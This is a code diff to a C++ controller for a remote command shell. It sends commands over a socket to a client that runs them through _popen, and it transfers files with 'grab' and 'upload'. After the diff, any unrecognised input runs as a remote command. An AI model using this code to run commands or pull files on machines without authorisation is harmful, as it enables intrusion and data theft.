@@ -59,35 +59,30 @@ private:
     */
     void parseSendCmd(std::string cmd){
         this->plainTextMessageHistory.push_back("--> " + cmd);
-        if(cmd.starts_with("help")){
-            this->help();
-        }
-        else if(cmd.starts_with("clear")){
+        if(cmd.starts_with("clear")){
             this->plainTextMessageHistory.clear();
         }
+
+        // These commands just make things a but more linux-like (they just call the windows equivalent)
         else if(cmd.starts_with("pwd")){
-            this->genericCmd("pwd;");
+            this->exec("cd");
         }
-        else if(cmd.starts_with("ls -a")){ // Important to check this before checking for just "ls"
+        else if(cmd.starts_with("ls -a") || cmd.starts_with("ls -la")){ // ls -la is what i type out of habit, so ill add it even though really the -l doesnt do anything
             this->exec("dir /a");
         }
         else if(cmd.starts_with("ls")){
             this->exec("dir");
         }
-        else if(cmd.starts_with("dir /a")){
-            this->exec("dir /a");
-        }
-        else if(cmd.starts_with("dir")){
-            this->exec("dir");
-        }
-        else if(cmd.starts_with("cd ")){
-            this->genericCmd("cd;" + cmd.substr(3) + ";");
-        }
         else if(cmd.starts_with("rm ")){
-            this->genericCmd("rm;" + cmd.substr(3) + ";");
+            this->exec("del " + cmd.substr(3));
         }
         else if(cmd.starts_with("mkdir ")){
-            this->genericCmd("mkdir;" + cmd.substr(6) + ";");
+            this->exec("md " + cmd.substr(6));
+        }
+
+        // Special commands that require their own special function:
+        else if(cmd.starts_with("cd ")){ // cd cant be handled by exec() becase _popen cant change the working directory of the client executable
+            this->genericCmd("cd;" + cmd.substr(3) + ";");
         }
         else if(cmd.starts_with("grab ")){
             this->grab(cmd.substr(5));
@@ -95,37 +90,14 @@ private:
         else if(cmd.starts_with("upload ")){
             this->upload(cmd.substr(7));
         }
-        else if(cmd.starts_with("exec ")){
-            this->exec(cmd.substr(5));
-        }
         else{
-            this->plainTextMessageHistory.push_back("Unknown command: " + cmd);
+            this->exec(cmd);
         }
     }
 
 
     /*
-        Display a list of available commands and what they do
-    */
-    void help(){
-        this->plainTextMessageHistory.push_back("= Available commands:");
-        this->plainTextMessageHistory.push_back("== help - Displays this help message");
-        this->plainTextMessageHistory.push_back("== clear - Clears the message history");
-        this->plainTextMessageHistory.push_back("== pwd - Displays the current working directory");
-        this->plainTextMessageHistory.push_back("== ls - Lists the files in the current working directory");
-        this->plainTextMessageHistory.push_back("== ls -a - Lists the files in the current working directory, including hidden files");
-        this->plainTextMessageHistory.push_back("== == (dir and dir /a are also valid commands)");
-        this->plainTextMessageHistory.push_back("== cd <path> - Changes the current working directory to <path>");
-        this->plainTextMessageHistory.push_back("== rm <path> - Removes the file at <path>");
-        this->plainTextMessageHistory.push_back("== mkdir <path> - Creates a directory at <path>");
-        this->plainTextMessageHistory.push_back("== grab <path> - Downloads the file at the remote <path> to this machine (at ./)");
-        this->plainTextMessageHistory.push_back("== upload <path> - Uploads the file at the local <path> to the remote machine");
-        this->plainTextMessageHistory.push_back("== exec <command> - Executes the command on the remote machine via _popen()");
-    }
-
-
-    /*
-        Used to call simple commands like cd, rm, mkdir, etc (these functions return a very simple response of fail/success)
+        genericCmd is used for very basic commands that dont require any special handling on the server side
         Response from client: <cmd>;<response>
     */
     void genericCmd(std::string cmd){
@@ -276,6 +248,7 @@ private:
             exec;<command>;<response length>;<response data>;
     */
     void exec(std::string cmd){
+        cmd += " 2>&1"; // Redirects stderr to stdout
         this->sockFdMutex.lock();
 
         // Send the command to the client
@@ -325,7 +298,6 @@ private:
         }
 
         // Add the response to the plain text message history:
-        this->plainTextMessageHistory.push_back("=== exec() response ===");
         // Split it up based on newlines to prevent crashing imgui (a single giant line will cause imgui/imtui to try and render too many triangles)
         // Example: calling "exec dir" inside system32 will return lots of stuff and it made it crash lol, but now it doesn't
         std::stringstream ss(std::string(response.begin(), response.end()-1));
@@ -333,8 +305,6 @@ private:
         while(std::getline(ss, line, '\n')){
             this->plainTextMessageHistory.push_back(line);
         }
-        this->plainTextMessageHistory.push_back("=== exec() response ===");
-
         this->sockFdMutex.unlock();
     }
 
